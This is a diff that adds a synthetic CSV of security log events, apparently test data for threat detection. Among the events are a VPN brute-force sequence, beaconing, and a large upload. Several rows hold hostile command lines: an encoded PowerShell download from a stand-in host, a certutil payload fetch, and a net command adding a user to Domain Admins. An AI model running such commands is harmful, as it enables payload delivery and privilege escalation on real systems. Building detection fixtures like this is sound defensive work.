@@ -1,0 +1,18 @@
+timestamp,event_type,host,username,source_ip,destination_ip,destination_domain,process_name,command_line,file_hash,status,action,bytes_out,message
+2026-06-24T08:58:00Z,auth,VPN-GW-01,alice,198.51.100.22,10.10.0.10,,sshd,,,success,login,0,Accepted login for alice
+2026-06-24T09:00:00Z,auth,VPN-GW-01,svc-backup,203.0.113.45,10.10.0.10,,sshd,,,failure,login,0,Failed VPN login for svc-backup
+2026-06-24T09:01:00Z,auth,VPN-GW-01,svc-backup,203.0.113.45,10.10.0.10,,sshd,,,failure,login,0,Failed VPN login for svc-backup
+2026-06-24T09:02:00Z,auth,VPN-GW-01,svc-backup,203.0.113.45,10.10.0.10,,sshd,,,failure,login,0,Failed VPN login for svc-backup
+2026-06-24T09:03:00Z,auth,VPN-GW-01,svc-backup,203.0.113.45,10.10.0.10,,sshd,,,failure,login,0,Failed VPN login for svc-backup
+2026-06-24T09:04:00Z,auth,VPN-GW-01,svc-backup,203.0.113.45,10.10.0.10,,sshd,,,failure,login,0,Failed VPN login for svc-backup
+2026-06-24T09:06:00Z,auth,VPN-GW-01,svc-backup,203.0.113.45,10.10.0.10,,sshd,,,success,login,0,Successful VPN login for svc-backup after failures
+2026-06-24T09:10:00Z,process,FIN-WS-07,mlee,10.20.5.17,203.0.113.91,malicious-update.test,powershell.exe,"powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgA; Invoke-WebRequest http://malicious-update.test/a.ps1 -OutFile C:\ProgramData\a.ps1",9f2c1a7b3e4d5c6f88990011aabbccddeeff00112233445566778899aabbccdd,success,process_start,0,Encoded PowerShell downloaded a script from external infrastructure
+2026-06-24T09:12:00Z,process,FIN-WS-07,mlee,10.20.5.17,203.0.113.91,malicious-update.test,certutil.exe,"certutil.exe -urlcache -split -f http://malicious-update.test/payload.exe C:\ProgramData\payload.exe",3b5d5c3712955042212316173ccf37be800f7c213ac82c13ec57d801aa34526f,success,process_start,0,Certutil used to fetch a payload
+2026-06-24T09:18:00Z,identity,DC-01,temp-admin,10.30.2.10,10.30.2.5,,net.exe,net group "Domain Admins" mlee /add /domain,,success,add_member,0,temp-admin added mlee to Domain Admins
+2026-06-24T09:25:00Z,network,DEV-LAPTOP-22,jchen,10.40.8.22,198.51.100.77,c2-checkin.evil-example.test,,,,allowed,connection,1800,HTTPS connection to c2-checkin.evil-example.test
+2026-06-24T09:30:00Z,network,DEV-LAPTOP-22,jchen,10.40.8.22,198.51.100.77,c2-checkin.evil-example.test,,,,allowed,connection,1750,HTTPS connection to c2-checkin.evil-example.test
+2026-06-24T09:35:00Z,network,DEV-LAPTOP-22,jchen,10.40.8.22,198.51.100.77,c2-checkin.evil-example.test,,,,allowed,connection,1820,HTTPS connection to c2-checkin.evil-example.test
+2026-06-24T09:40:00Z,network,DEV-LAPTOP-22,jchen,10.40.8.22,198.51.100.77,c2-checkin.evil-example.test,,,,allowed,connection,1795,HTTPS connection to c2-checkin.evil-example.test
+2026-06-24T09:45:00Z,network,DEV-LAPTOP-22,jchen,10.40.8.22,198.51.100.77,c2-checkin.evil-example.test,,,,allowed,connection,1815,HTTPS connection to c2-checkin.evil-example.test
+2026-06-24T10:05:00Z,network,HR-FILE-02,apatel,10.50.3.44,203.0.113.200,file-dropbox-sync.test,,,,allowed,connection,73400320,Large outbound upload to file-dropbox-sync.test
+2026-06-24T10:20:00Z,process,ENG-WS-15,developer,10.60.9.25,192.0.2.54,packages.example.test,python.exe,python.exe -m pip install requests,,success,process_start,0,Expected developer package installation
